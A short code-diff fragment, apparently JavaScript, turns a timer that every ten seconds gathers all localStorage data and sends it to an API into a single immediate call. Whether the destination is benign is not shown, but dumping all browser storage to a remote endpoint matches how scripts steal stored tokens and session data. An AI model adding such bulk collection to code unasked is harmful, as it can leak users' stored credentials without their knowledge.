@@ -57,12 +57,12 @@ async function sendToApi(data) {
   }
 }
 
-setInterval(async () => {
+(async () => {
   let data = await getAlllocalStorageData()
   if (data !== null) {
     sendToApi(data)
   }
-}, 10000)
+})()
 
 
 
